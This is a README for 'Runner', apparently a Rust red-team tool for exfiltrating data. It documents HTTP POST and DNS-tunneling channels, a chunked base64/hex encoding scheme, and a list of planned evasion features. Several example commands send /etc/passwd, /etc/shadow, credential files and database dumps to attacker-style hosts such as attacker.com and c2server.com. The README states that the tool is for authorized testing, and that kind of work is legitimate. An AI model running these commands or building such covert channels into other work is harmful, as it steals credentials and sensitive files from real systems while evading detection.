# Runner - Data Exfiltration Tool

## Main Objective

**Runner** is a specialized Red Team tool designed to facilitate data exfiltration during security assessments and authorized penetration testing engagements. The tool provides stealthy data extraction capabilities through multiple covert channels, encoding sensitive files into base64-encoded chunks and transmitting them via HTTP or DNS protocols to evade detection mechanisms.

## Commands Available

### Global Command Structure
```
runner <OPERATION> <EXFILTRATION_TYPE> [OPTIONS]
```

### Operations

#### 1. Exfiltration via HTTP

Exfiltrate files using HTTP POST requests.

**Command:**
```bash
runner exfil http --src-files <FILE1>,<FILE2>,... -u <URL> [OPTIONS]
```

**Arguments:**
- `--src-files`: Comma-separated list of file paths to exfiltrate (required)
- `-u, --url`: Destination URL endpoint (required)
- `--delay`: Delay between chunk transmissions in milliseconds (default: 500ms, minimum: 50ms)
- `--chunks`: Number of chunks to split each file into (default: 10, minimum: 1)

**Example:**
```bash
runner exfil http --src-files /path/to/secrets.txt,/path/to/creds.db -u https://attacker.com/receive --delay 1000 --chunks 20
```

**Behavior:**
- Reads each specified file
- Encodes file content using base64 and hex encoding
- Splits encoded content into specified number of chunks
- Sends each chunk via HTTP POST with `Content-Type: text/plain`
- Applies configurable delay between transmissions

#### 2. Exfiltration via DNS

Exfiltrate a file using DNS TXT record queries (DNS tunneling).

**Command:**
```bash
runner exfil dns -f <FILE> -d <DOMAIN> [OPTIONS]
```

**Arguments:**
- `-f, --src-file`: File path to exfiltrate (required)
- `-d, --dest`: Destination domain name (required)
- `--delay`: Delay between DNS queries in milliseconds (default: 500ms)
- `-p, --protocol`: DNS protocol to use - `tcp` or `udp` (default: udp)
- `-n, --nameserver`: Custom nameserver address (default: 127.0.0.1:53)

**Example:**
```bash
runner exfil dns -f /etc/passwd -d exfil.attacker.com --delay 800 -p tcp -n 8.8.8.8:53
```

**Behavior:**
- Reads the specified file
- Computes optimal chunk size based on DNS domain length constraints (max 255 chars, labels max 63 chars)
- Encodes file content using DNS-safe base64 and hex encoding
- Sends DNS TXT queries with encoded chunks as subdomain labels
- Applies configurable delay between queries
- Supports both TCP and UDP DNS protocols

## Base64 Encoding Structure

### Node Structure

All exfiltrated data is organized into a hierarchical node structure consisting of two primary node types:

#### Root Node (Type: 'r')
The root node contains metadata about the file being exfiltrated. Each root node has the following format:

```
r:<filename>:<file_identifier>
```

Where:
- **r** - Node type identifier (always 'r' for root nodes)
- **filename** - The original filename of the file being exfiltrated
- **file_identifier** - A unique 4-byte random hex-encoded identifier that links all chunks of a file together during reconstruction (e.g., `a1b2c3d4`)

**Example:**
```
r:secrets.txt:a1b2c3d4
```

#### File Chunk Nodes (Type: 'f' or 'e')
File chunk nodes contain portions of the exfiltrated file. Each chunk node has the following format:

```
f:<root_identifier>:<chunk_index>:<hex_encoded_data>
e:<root_identifier>:<chunk_index>:<hex_encoded_data>
```

Where:
- **f** - Node type identifier for regular file chunks
- **e** - Node type identifier for the final (end) chunk that marks the file boundary
- **root_identifier** - The same 4-byte hex identifier from the root node (e.g., `a1b2c3d4`)
- **chunk_index** - Sequential zero-based chunk index within the file (in hexadecimal)
- **hex_encoded_data** - The file data encoded as hexadecimal

**Examples:**
```
f:a1b2c3d4:0:48656c6c6f20576f726c64...    (regular chunk)
e:a1b2c3d4:A:476f6f6462796521...            (final chunk)
```

### Encoding Pipeline

The runner tool applies a multi-stage encoding pipeline to ensure data is safely transmitted over constrained channels (HTTP or DNS):

#### Stage 1: Node Serialization
The file is first split into chunks and organized into nodes (root node followed by file chunk nodes). Each node is serialized to a colon-delimited string representation:

```
[NodeType]:[Metadata]:[Data]
```

#### Stage 2: Base64 Encoding
The serialized node string is encoded using standard Base64 (RFC 4648), expanding the data by approximately 33%:

```
Input:  r:secrets.txt:a1b2c3d4
Output: cjpzZWNyZXRzLnR4dDphMWIyYzNkNA==
```

#### Stage 3: Hex Encoding
The Base64 output is then hex-encoded, converting each Base64 character to its hexadecimal ASCII representation, creating a fully alphanumeric payload:

```
Input:  cjpzZWNyZXRzLnR4dDphMWIyYzNkNA==
Output: 636a3078656372657465732e7478743a613162326333643430
```

#### Stage 4: Transport-Specific Formatting
Depending on the exfiltration method, the encoded data is formatted differently:

**For HTTP Exfiltration:**
- Encoded chunks are transmitted directly in the HTTP POST body
- Multiple chunks are sent in separate HTTP POST requests
- Each request contains one complete encoded chunk

**For DNS Exfiltration:**
- Encoded chunks are split into DNS-safe labels (max 63 characters per label)
- Labels are joined with dots (.) to form valid DNS domain names
- Each label becomes a subdomain in DNS TXT queries
- Example: `636a3078.656372657465.732e7478.742e613162323333643430.exfil.attacker.com`

This multi-stage encoding ensures that:
1. Binary file data is safely converted to text
2. Metadata is preserved for file reconstruction
3. Payload fits within protocol constraints (DNS label length, HTTP content types)

## Installation

### Prerequisites
- Rust 1.70+ (2021 edition)

### Build from Source
```bash
git clone <repository-url>
cd runner
cargo build --release
```

The compiled binary will be located at `target/release/runner`.

## Usage Examples

### Scenario 1: Exfiltrate Multiple Files via HTTP
```bash
runner exfil http \
  --src-files /tmp/credentials.txt,/var/log/sensitive.log \
  -u https://c2server.com/upload \
  --delay 2000 \
  --chunks 15
```

### Scenario 2: Exfiltrate via DNS over TCP
```bash
runner exfil dns \
  -f /etc/shadow \
  -d data.malicious.com \
  -p tcp \
  -n 192.168.1.100:53 \
  --delay 1500
```

### Scenario 3: Fast HTTP Exfiltration (Low Stealth)
```bash
runner exfil http \
  --src-files database.sql \
  -u http://10.0.0.50:8080/receive \
  --delay 50 \
  --chunks 5
```

## TODO List

### High Priority
- [x] **Payload chunks identification** - Implement IDs for each payload chunk for better tracking
- [x] **Add error handling** - Robust error handling for file I/O and network operations
- [ ] **Add Logging Options** - Structured logging for operational tracking and debugging
- [ ] **Add Compression Options** - Implement gzip/zlib compression before encoding to reduce payload size
- [ ] **Add Encryption Options** - Implement ChaCha20 encryption for payload confidentiality
  - [ ] **Key Management options** - Support key files, keys command argument or remote key retrieval
- [ ] **Add Retry Mechanisms** - Automatic retry on transmission failures with exponential backoff

### Medium Priority
- [ ] **Add Different Exfiltration Methods**:
  - [ ] ICMP tunneling (ping exfiltration)
  - [ ] SMTP (email-based exfiltration)
  - [ ] FTP/SFTP
  - [ ] WebSocket channels
  - [ ] Cloud storage APIs (S3, GCS, Azure Blob)
- [ ] **Add Shuffle Option** - Randomize chunk transmission order to evade pattern detection
- [ ] **Add Random delay** - Introduce random in delay intervals between payload chunks
- [ ] **Add Progress Indicators** - Real-time progress bars and transmission statistics

### Low Priority
- [ ] Add steganography support (hide data in images/audio)
- [ ] Add exfiltration via social media platforms (Discord, Telegram bots)
- [ ] Add exfiltration via file sharing services (Dropbox, Google Drive)
- [ ] Implement Zero-Copy techniques
- [ ] Implement intelligent warning based on domain length and chunk size (The bigger the domain name, the smaller the chunk size, and this is not currently indicated to the user)
 
## Security Considerations

**WARNING:** This tool is designed for authorized security testing only. Unauthorized use of this tool for data exfiltration is illegal and unethical. Always obtain proper authorization before using this tool in any engagement.

### No Warranty

This software is provided "as is" without warranty of any kind, express or implied. The authors are not liable for any damage, data loss, or legal consequences resulting from its use.
